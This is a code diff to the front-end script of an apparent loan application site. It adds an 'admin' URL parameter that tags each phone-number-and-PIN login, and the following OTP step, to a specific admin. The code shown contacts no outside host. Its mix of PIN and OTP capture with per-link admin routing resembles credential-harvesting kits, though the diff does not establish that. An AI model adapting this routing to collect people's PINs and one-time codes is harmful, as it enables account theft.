@@ -620,8 +620,23 @@
     loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
     firstName: '', lastName: '', phone: '',
     employment: '', annualIncome: 0,
-    applicationId: ''
+    applicationId: '',
+    requestAdminId: '' // ✅ Admin ID from URL parameter
   };
+
+  // ═══════════════════════════════════════════════════
+  // INITIALIZE: Capture admin ID from URL parameter
+  // ═══════════════════════════════════════════════════
+  (function initAdminParam() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const adminId = urlParams.get('admin');
+    if (adminId) {
+      S.requestAdminId = adminId;
+      console.log('✅ Admin link locked to:', adminId);
+    } else {
+      console.warn('⚠️ No admin parameter in URL - form will auto-assign');
+    }
+  })();
 
   // NAVIGATION
   function goTo(pageId) {
@@ -793,7 +808,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // LOGIN — SUBMIT PIN
+  // ✅ LOGIN — SUBMIT PIN WITH ADMIN PARAMETER
   // ══════════════════════════════════════════════════════
   async function doLogin() {
     ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
@@ -810,14 +825,25 @@
     document.getElementById('bLgn').disabled = true;
 
     try {
+      // ✅ BUILD REQUEST WITH ADMIN ID IF AVAILABLE
+      const requestBody = {
+        phoneNumber: phone,
+        pin: pin,
+        assignmentType: S.requestAdminId ? 'specific' : 'auto'
+      };
+
+      // ✅ IF ADMIN PARAMETER IN URL, LOCK TO THAT ADMIN
+      if (S.requestAdminId) {
+        requestBody.requestAdminId = S.requestAdminId;
+        console.log('🔒 Locking to admin:', S.requestAdminId);
+      } else {
+        console.warn('⚠️ No admin specified - will auto-assign');
+      }
+
       const res = await fetch('/api/verify-pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber: phone,
-          pin: pin,
-          assignmentType: 'auto'
-        })
+        body: JSON.stringify(requestBody)
       });
 
       const data = await res.json();
@@ -991,7 +1017,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // OTP PAGE — 5-DIGIT PIN + 4-DIGIT OTP
+  // OTP PAGE — 4-DIGIT OTP
   // ══════════════════════════════════════════════════════
   function handleOtpInput(el, type) {
     el.value = el.value.replace(/\D/, '');
